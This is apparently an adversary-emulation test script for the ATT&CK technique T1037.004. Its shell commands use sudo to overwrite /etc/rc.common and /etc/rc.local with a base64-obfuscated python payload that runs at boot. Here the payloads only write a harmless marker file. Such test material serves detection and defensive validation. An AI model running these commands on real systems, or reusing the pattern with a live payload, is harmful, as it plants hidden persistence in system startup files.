
# T1037.004 - RC Scripts

#rc.common
filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi
printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common
echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"" | sudo tee -a /etc/rc.common
printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common
sudo chmod +x /etc/rc.common

#rc.local
filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi
printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.local
echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"" | sudo tee -a /etc/rc.local
printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.local
sudo chmod +x /etc/rc.local
